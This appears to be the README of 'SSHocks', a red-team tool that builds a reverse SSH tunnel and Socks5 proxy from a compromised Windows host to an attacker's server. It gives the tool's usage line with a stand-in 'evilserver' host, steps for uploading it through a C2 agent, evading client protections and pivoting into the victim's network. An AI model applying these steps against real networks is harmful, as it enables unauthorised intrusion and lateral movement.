<h1>SSHocks v.1.0.0</h1>
                                       
SSHocks was born out of a penetration testing need. On a Red Team engagement, we need to get a Socks5 proxy up and fast. We originally had one working through an SSH tunnel using OpenSSH installed on a Windows 10 target. However, partway through our engagement, the client placed protections that stopped ssh.exe from functioning. I got to work and cobbled together this simple SSH client with full Socks5 support. I wanted it to be a single executable file so it was easy to upload. It's built targeting .NET 6.0. You can retarget as needed. This project can be published via *dotnet* as a single file.

-Example: *dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true*

The latest release is confirmed to work on Windows 10 hosts. It has not yet been tested on other versions of Windows. (I just built it! Give me time man!) If you've tried it on something other than Windows 10, please let me know!

**USAGE:** SSHocks.exe [SSH server] [SSH Port] [username] [path to private key] [remote socks port]

(Ex. SSHocks.exe evilserver.example.com 2222 victimUser C:\Path\to\keyfile\id_ed25519 1080)

**NOTES:**

1. You will need to create the user account on your SSH server. Then, generate a keypair on your SSH server for your victim's user account. **DO NOT SET A PASSWORD ON THE KEY.** SSHocks supports both ed_25519 and RSA keys.

2. Upload the key and SSHocks.exe to the victim host using your C2 agent or whatever other means you might have for uploading sketchy stuff. **(At this time, SSHocks cannot be assembly loaded. I'm working on fixing that. Any assistance is appreciated!)**

3. Execute using your prefered binary execution method.

4. By default, the program will open port 1080 on the victim host as the receiving port for all Socks5 traffic. This can be changed in source as needed.
   
5. Once the client is connected to your attack SSH server and you've verified the proxy port is listening, you can use any proxy aware program or tool to attack the victim's network. Use Proxychains with non-proxy aware tools. Just make sure your proxychains.conf file is properly configured for the correct port and is using socks5.

6. **SHUT DOWN** Since the point was to use this via a C2 impant which is likely to not provide an interactive shell, I baked in a way to gracefully shut the proxy and tunnel down using a remote proxy command. Simply use proxychains or some other means to send:
  
   *curl xxx.xxx*
   
The proxy will receive the connection request and interpret it as a command to shutdown, and will disconnect gracefully.

<h2>To Do:</h2>
- Modify source to be able to be loaded using Assembly Reflection
